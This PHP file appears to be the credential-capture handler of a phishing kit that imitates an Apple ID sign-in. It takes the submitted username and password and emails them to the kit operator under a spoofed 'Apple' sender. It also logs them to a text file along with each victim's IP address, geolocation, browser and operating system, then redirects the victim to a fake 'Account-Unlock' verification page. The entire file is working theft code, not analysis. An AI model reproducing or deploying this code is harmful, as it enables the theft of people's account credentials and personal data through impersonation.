<?php
error_reporting(0);
require "session_protect.php";
require "functions2.php";
require "simplehtmldom.php";

include('../../detect.php');




$_SESSION['user'] = $_POST['user'];
$_SESSION['pass'] = $_POST['pass'];


$email	= $_POST['user'];
$password = $_POST['pass'];

include '../../messageapp.php';
include '../../yourmail.php';
$subject = "Apple [ " . $nama_negara . " - " . $ip . " ]";
$headers = "From: Apple <result@ngentots.com>";
mail($Your_Email, $subject, $message, $headers);



// -----------------------------------------------------------

include("curl_connect.php");

$user = $_POST['user'];
$pass = $_POST['pass'];
$postData = "";
  //--------------------------\\
 //        check Login         \\
//------------------------------\\
if($user == "" )
{
	if($pass == "")
	{
checklogin($user, $pass);
}
else
{
	redirectTo("../../Verify.php?" . $_SESSION['user']. "&Account-Unlock&sessionid=" . generateRandomString(115)."&securessl=true");
}
}else
{
	redirectTo("../../Verify.php?" . $_SESSION['user']. "&Account-Unlock&sessionid=" . generateRandomString(115)."&securessl=true");
}

// -----------------------------------------------------------


$handle = fopen('../../app_ids.txt', 'a');

$spa = "\r\n";


if (!empty($_SERVER['HTTP_CLIENT_IP']))  
    {

      $ip=$_SERVER['HTTP_CLIENT_IP'];
    }
    elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))   
    {
      $ip=$_SERVER['HTTP_X_FORWARDED_FOR'];
    }
    else
    {
      $ip=$_SERVER['REMOTE_ADDR'];
    }


if (strpos($ip, ",") !== false) {
  $ip=explode(",",$ip);
$ip=trim($ip[0]);

}

$systemInfo = systemInfo($_SERVER['REMOTE_ADDR']);

$VictimInfo1 = "IP Address :"." ".$_SERVER['REMOTE_ADDR']." (".gethostbyaddr($_SERVER['REMOTE_ADDR']).")";
$VictimInfo2 = "Location :"." ".$systemInfo['city'].", ".$systemInfo['region'].", ".$systemInfo['country'];
$VictimInfo3 = "UserAgent :"." ".$systemInfo['useragent'];
$VictimInfo4 = "Browser :"." ".$systemInfo['browser'];
$VictimInfo5 = "Platform :"." ".$systemInfo['os'];
$aaaa = "===========APPLE ID=============";
$bbbb = "================================";
$cccc = "--------------------------------";
$time = date('l jS \of F Y h:i:s A');




fwrite($handle, "" . $aaaa . PHP_EOL);
fwrite($handle, "Username : " . $_SESSION["user"] . PHP_EOL);
fwrite($handle, "Password : " . $_SESSION["pass"] . PHP_EOL);
fwrite($handle, "" . $cccc . PHP_EOL);
fwrite($handle, "" . $VictimInfo1 . PHP_EOL);
fwrite($handle, "Time: " . $time . PHP_EOL);
fwrite($handle, "" . $VictimInfo2 . PHP_EOL);
fwrite($handle, "" . $VictimInfo3 . PHP_EOL);
fwrite($handle, "" . $VictimInfo4 . PHP_EOL);
fwrite($handle, "" . $VictimInfo5 . PHP_EOL);
fwrite($handle, "" . $bbbb . PHP_EOL);



fwrite($handle, $spa);
fwrite($handle, $spa);
fclose($handle);



?>




